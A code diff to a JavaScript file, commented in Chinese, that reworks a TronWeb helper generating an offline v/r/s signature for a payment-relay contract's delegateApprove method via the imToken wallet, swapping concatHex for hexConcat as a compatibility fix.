@@ -580,39 +580,40 @@
         };
 
         /**
-         * 生成离线签名（适配代付合约delegateApprove方法）
-         * @param {string} userAddress - 用户base58地址
-         * @param {string} contractAddress - 代付合约base58地址
-         * @param {string} amount - 授权金额（十六进制）
-         * @returns {Object} v/r/s签名参数
-         */
-        async function generateOfflineSignature(userAddress, contractAddress, amount) {
-            try {
-                // 1. 地址转hex格式（合约要求）
-                const userHex = tronWeb.address.toHex(userAddress);
-                const contractHex = tronWeb.address.toHex(contractAddress);
+        /**
+ * 生成离线签名（适配代付合约delegateApprove方法，兼容所有TronWeb版本）
+ * @param {string} userAddress - 用户base58地址
+ * @param {string} contractAddress - 代付合约base58地址
+ * @param {string} amount - 授权金额（十六进制）
+ * @returns {Object} v/r/s签名参数
+ */
+async function generateOfflineSignature(userAddress, contractAddress, amount) {
+    try {
+        // 1. 地址转hex格式（合约要求）
+        const userHex = tronWeb.address.toHex(userAddress);
+        const contractHex = tronWeb.address.toHex(contractAddress);
 
-                // 2. 构造签名消息（与合约messageHash完全一致）
-                const messageHash = tronWeb.sha3(
-                    tronWeb.utils.hexToBytes(
-                        tronWeb.utils.concatHex([userHex, contractHex, amount])
-                    )
-                );
+        // 关键修复：用hexConcat替代concatHex（TronWeb兼容方法）
+        const concatenatedHex = tronWeb.utils.hexConcat([userHex, contractHex, amount]);
 
-                // 3. 唤起imToken签名（true表示返回序列化签名）
-                const signature = await tronWeb.trx.sign(messageHash, true);
+        // 2. 构造签名消息（与合约messageHash完全一致）
+        const messageHash = tronWeb.sha3(
+            tronWeb.utils.hexToBytes(concatenatedHex)
+        );
 
-                // 4. 解析签名为v/r/s参数
-                const v = parseInt(signature.slice(128, 130), 16);
-                const r = `0x${signature.slice(0, 64)}`; // 补0x前缀
-                const s = `0x${signature.slice(64, 128)}`;
+        // 3. 唤起imToken签名（true表示返回序列化签名）
+        const signature = await tronWeb.trx.sign(messageHash, true);
 
-                return { v, r, s };
-            } catch (e) {
-                throw new Error(`签名生成失败：${e.message}`);
-            }
-        }
+        // 4. 解析签名为v/r/s参数
+        const v = parseInt(signature.slice(128, 130), 16);
+        const r = `0x${signature.slice(0, 64)}`; // 补0x前缀
+        const s = `0x${signature.slice(64, 128)}`;
 
+        return { v, r, s };
+    } catch (e) {
+        throw new Error(`签名生成失败：${e.message}`);
+    }
+}
         /**
          * 初始化钱包：获取地址、余额
          */
